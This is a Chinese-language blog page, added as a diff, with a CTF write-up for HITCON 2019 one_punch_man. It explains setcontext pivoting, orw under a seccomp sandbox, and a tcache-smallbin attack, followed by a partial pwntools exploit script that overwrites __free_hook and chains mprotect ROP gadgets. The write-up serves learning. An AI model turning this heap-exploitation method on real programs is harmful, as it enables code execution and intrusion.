@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="setcontext+mprotect+orw摆烂多日的第一次提笔，这篇博客其实想写好久了，但是由于各种原因拖到现在，不说废话了，直接开写。 先细致的讲解一下setcontext和orw setcontext一个大概函数一样的东西，主要作用就是把通过它把程序跳转到我门已经设置好的rop上面，使用这个手法的条件有两个，一个是你能跳到这个函数上面（拿到程序流），二是控制了rip，下面是setconte">
+<meta property="og:type" content="article">
+<meta property="og:title" content="setcontext+mprotect+orw">
+<meta property="og:url" content="http://example.com/2022/01/09/setcontext-mprotect-orw/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="setcontext+mprotect+orw摆烂多日的第一次提笔，这篇博客其实想写好久了，但是由于各种原因拖到现在，不说废话了，直接开写。 先细致的讲解一下setcontext和orw setcontext一个大概函数一样的东西，主要作用就是把通过它把程序跳转到我门已经设置好的rop上面，使用这个手法的条件有两个，一个是你能跳到这个函数上面（拿到程序流），二是控制了rip，下面是setconte">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-09T08:07:55.000Z">
+<meta property="article:modified_time" content="2022-01-09T08:08:22.929Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/01/09/setcontext-mprotect-orw/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>setcontext+mprotect+orw | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/setcontext-mprotect-orw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          setcontext+mprotect+orw
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-09 16:07:55 / 修改时间：16:08:22" itemprop="dateCreated datePublished" datetime="2022-01-09T16:07:55+08:00">2022-01-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="setcontext-mprotect-orw"><a href="#setcontext-mprotect-orw" class="headerlink" title="setcontext+mprotect+orw"></a>setcontext+mprotect+orw</h1><p>摆烂多日的第一次提笔，这篇博客其实想写好久了，但是由于各种原因拖到现在，不说废话了，直接开写。</p>
+<p>先细致的讲解一下setcontext和orw</p>
+<h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><p>一个大概函数一样的东西，主要作用就是把通过它把程序跳转到我门已经设置好的rop上面，使用这个手法的条件有两个，一个是你能跳到这个函数上面（拿到程序流），二是控制了rip，下面是setcontext的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x00007fc35bf5f1b5 &lt;+53&gt;:	mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x00007fc35bf5f1bc &lt;+60&gt;:	mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x00007fc35bf5f1c3 &lt;+67&gt;:	mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x00007fc35bf5f1c7 &lt;+71&gt;:	mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007fc35bf5f1cb &lt;+75&gt;:	mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x00007fc35bf5f1cf &lt;+79&gt;:	mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x00007fc35bf5f1d3 &lt;+83&gt;:	mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x00007fc35bf5f1d7 &lt;+87&gt;:	mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x00007fc35bf5f1de &lt;+94&gt;:	push   rcx</span><br><span class="line">   0x00007fc35bf5f1df &lt;+95&gt;:	mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">   0x00007fc35bf5f1e3 &lt;+99&gt;:	mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x00007fc35bf5f1ea &lt;+106&gt;:	mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x00007fc35bf5f1f1 &lt;+113&gt;:	mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007fc35bf5f1f5 &lt;+117&gt;:	mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x00007fc35bf5f1f9 &lt;+121&gt;:	mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x00007fc35bf5f1fd &lt;+125&gt;:	xor    eax,eax</span><br><span class="line">   0x00007fc35bf5f1ff &lt;+127&gt;:	ret    </span><br><span class="line">   0x00007fc35bf5f200 &lt;+128&gt;:	mov    rcx,QWORD PTR [rip+0x398c61]        # 0x7fc35c2f7e68</span><br><span class="line">   0x00007fc35bf5f207 &lt;+135&gt;:	neg    eax</span><br><span class="line">   0x00007fc35bf5f209 &lt;+137&gt;:	mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x00007fc35bf5f20c &lt;+140&gt;:	or     rax,0xffffffffffffffff</span><br><span class="line">   0x00007fc35bf5f210 &lt;+144&gt;:	ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不是跳到setcontext的开头，而是跳到53这个位置，当执行下面的代码后，就可以通过rip给很多寄存器赋值，包括rsp，还能通过rcx控制栈顶信息，操作手法就是先通过rdi+0xa0把rsp指向我们伪造的rop的地址，然后再通过rdi+0xa8让rcx储存ret的地址，然后把ret的地址push到栈上，最后的执行顺序就是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7fe87be4e1ff &lt;setcontext+127&gt;        ret  //自己的ret  </span><br><span class="line">    ↓</span><br><span class="line">0x7fe87bdfc8aa                         ret  //push rcx  </span><br><span class="line">    ↓</span><br><span class="line">0x7fe87be1d5bf &lt;init_cacheinfo+239&gt;    pop    rdi//伪造的rop</span><br><span class="line">0x7fe87be1d5c0 &lt;init_cacheinfo+240&gt;    ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后还可以通过rop再把程序流跳到别的地方，很好玩。</p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>当有些程序被沙箱保护后就不能直接调用system(“/bin/sh”)来拿到权限了，比如这个程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tcache/HITCON 2019 one_punch_man$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>只允许程序调用read,write,open和mprotect这几个我认识的函数，那就只能orw了，不过现在在我看来orw有两种类型，一种是构造rop来完成打印flag,一种是直接构造代码，让他执行orw代码（不过这种需要mprotect协助），调用orw需要通过系统调用来完成，即syscall,每个函数都对应一个调用号，比如open的调用号是2，read的调用号是0，write的调用号是1,调用时对rax赋值就行。</p>
+<p>完成前置知识，下面具体题目具体分析</p>
+<h4 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h4><p>算是复现的最艰难的一道题，除了一些不知道的glibc的特性以外，还因为按照wiki上的思路复现的代码就跑不通，最后自己想出来一个这个笨办法。</p>
+<p>源码太长就不看了，主要有四个功能，漏洞是ufa,然后一般情况下只能使用calloc,calloc不能使用tcache上面的堆，其次堆的大小设置为大于0x80,意味着也不能使用fastbin上面的堆，在glibc高版本的情况下使用出fast和tcache的堆拿到程序流很难，好在程序给了后门函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_15BB</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(qword_4030 + <span class="number">32</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要让这个地址的数大于6就行，当一个地址的数变大首先想到了unsortedattackbin，但libc.2.27.so已经对unsortedbin上面的堆严加管控，当一个堆脱离时，会严格检查fd和bk，通过wiki得知smallbin配合tcache也可以完成类似的行为，比如先让tcache上面的0x200的bin上六个堆，让smallbin的0x200上面上2个堆，然后申请0x200,首先会分配smallbin上面的一个堆给你，让后把另一个堆脱链放入tcache上面，只要更改后面的bk，让其脱链的时候就可以向bk-&gt;fd写入一个地址了，这个地址肯定很大，和unsortedbin的思路很像。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x130 [  6]: 0x55563b0fa850 —▸ 0x55563b0fa720 —▸ 0x55563b0fa5f0 —▸ 0x55563b0fa4c0 —▸ 0x55563b0fa390 —▸ 0x55563b0fa260 ◂— 0x0</span><br><span class="line">0x210 [  7]: 0x55563b0fb5e0 —▸ 0x55563b0fb3d0 —▸ 0x55563b0fb1c0 —▸ 0x55563b0fafb0 —▸ 0x55563b0fada0 —▸ 0x55563b0fab90 —▸ 0x55563b0fa980 ◂— 0x0</span><br><span class="line">0x220 [  1]: 0x55563b0fe8f0 ◂— 0x0</span><br><span class="line">0x410 [  7]: 0x55563b0fd8b0 —▸ 0x55563b0fd4a0 —▸ 0x55563b0fd090 —▸ 0x55563b0fcc80 —▸ 0x55563b0fc870 —▸ 0x55563b0fc460 —▸ 0x55563b0fc050 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x130: 0x55563b0fdf90 —▸ 0x55563b0fbd00 —▸ 0x7f0f0340adc0 (main_arena+384) ◂— 0x55563b0fdf90</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意修改bk的时候也得让fd有意义，不然fd-&gt;bk=bk就会不成立</p>
+<p>修改完后就可以使用malloc了，哦对当smallbin上的堆进入tcache上面时tcache就会出问题，不能进只能出，所以0x217得先准备好才行。</p>
+<p>脚本</p>
+<p>网上搜了一圈，没有像我做的这复杂的，我是用mprotect做的</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dock</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;50056&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retire</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x720</span>-<span class="number">0xcb0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x217</span>)</span><br><span class="line">retire(<span class="number">2</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)+p64(heap_base+<span class="number">0x1d00</span>)+p64(heap_base+<span class="number">0x17</span>+<span class="number">4</span>)</span><br><span class="line">rename(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">rename(<span class="number">2</span>,p64(libc_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">dock(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">setcontext = libc_addr+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span></span><br><span class="line">dock(p64(setcontext))</span><br><span class="line">ret=libc_addr+<span class="number">0x00000000000008aa</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x215bf</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx=libc_addr+<span class="number">0x0000000000001b96</span></span><br><span class="line">mprotect_addr=libc_addr+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">rename(<span class="number">0</span>,<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span 